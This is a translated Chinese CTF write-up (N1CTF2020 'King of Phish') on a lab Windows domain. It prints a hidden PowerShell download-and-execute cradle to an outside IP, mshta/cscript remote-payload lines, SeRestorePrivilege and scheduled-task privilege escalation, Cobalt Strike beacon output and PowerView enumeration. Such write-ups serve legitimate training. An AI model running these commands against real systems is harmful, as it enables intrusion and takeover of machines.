# N1CTF2020 Pentest: King of Phish

### 译文声明
本文为翻译文章，仅供参考。具体内容和含义以原文为准。

## 前言
N1CTF2020 中的几道域题目设计精良，现与各位分享，希望能为大家提供一些帮助。

## The King Of Phish (Victim Bot)
在这个挑战中，我们使用了 `lnk` 命令执行技术。测试发现，命令参数不能超过一个。可以通过将空格替换为制表符来绕过这一限制。通过 Cobalt Strike（CS）启动一个 Web 服务，并执行以下 PowerShell 命令：
```powershell
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://132.232.82.54:12345/a1'))"
```
成功获取到 shell 后，读取目标文件内容：
```powershell
type c:\users\usera\desktop\flag.txt
```

查阅 Write-Up 发现还有其他多种方法可以实现相同的目标，例如：
```powershell
C:\Windows\System32\cmd.exe /c type %USERPROFILE%\Desktop\flag.txt
C:\Windows\System32\cmd.exe /k"whoami"
C:\Windows\System32\mshta.exe http://xxx.xxx.xxx.xxx:8080/1.hta
C:\Windows\System32\cscript.exe \\xxx.xxx.xxx.xxx\public\test.vbs
```

## The King Of Phish (UserA-PC)
### 预期解法：SeRestorePrivilege 提权
在三好学生博客中可以找到关于 SeRestorePrivilege 的相关说明，即利用 SeRestore 权限修改注册表，劫持高权限进程从而启动我们的 shell。

GitHub 上提供了相应的 C++ 代码示例：
[EnableSeRestorePrivilege.cpp](https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeRestorePrivilege.cpp)

下载并修改 `se_restore_priv` 函数以劫持 `wsqmcons.exe` 进程。需要注意的是，必须在 Windows 环境下用 Visual Studio 编译，编译器需设置为 MT，且远程主机应为 x86 架构。尽管我在 x64 平台上尝试了 5 小时，但最终仍需要切换至 x86 版本。

编译完成后上传并执行 shell。此外，我们还可以利用计划任务进行提权。使用 PowerView 模块查询特定计划任务的安全描述符：
```powershell
beacon> shell powershell Import-Module ./powerview.ps1;"Get-ScheduledTask|? TaskName -eq Consolidator |select -exp SecurityDescriptor|ConvertFrom-SddlString|select -exp DiscretionaryAcl|Format-Table -AutoSize"
```
输出结果表明，当前用户对 `Consolidator` 任务有执行权限。手动触发该任务以获得 SYSTEM 权限：
```powershell
schtasks /Run /TN "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator"
```

完整过程如下：
```powershell
beacon> shell getflag.exe
[*] Tasked beacon to run: test.exe
[+] host called home, sent: 39 bytes
[+] received output:
whoami:
N1CTF\usera
whoami /priv
SeRestorePrivilege Enabled
SeChangeNotifyPrivilege Enabled by default
SeIncreaseWorkingSetPrivilege Disabled
[+] Key set
beacon> shell schtasks /Run /TN "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator"
[*] Tasked beacon to run: schtasks /Run /TN "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator"
[+] host called home, sent: 122 bytes
[+] received output:
SUCCESS: Attempted to run the scheduled task "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator".
```

### 使用资源约束委派提权
首先，使用 PowerView 收集域信息：
```powershell
beacon> shell powershell Import-module ./powerview.ps1;Get-DomainUser -Identity USERA-pc -Properties objectsid
beacon> shell powershell Import-module ./powerview.ps1;Get-DomainUser -Identity usera -Properties objectsid
beacon> shell powershell Import-module ./powerview.ps1;"Get-DomainObjectAcl -Identity USERA-PC | ?{$_.SecurityIdentifier -match 'S-1-5-21-3860493963-3742860931-3732056798-1105'}"
```

根据收集的信息，我们可以进一步实施攻击策略。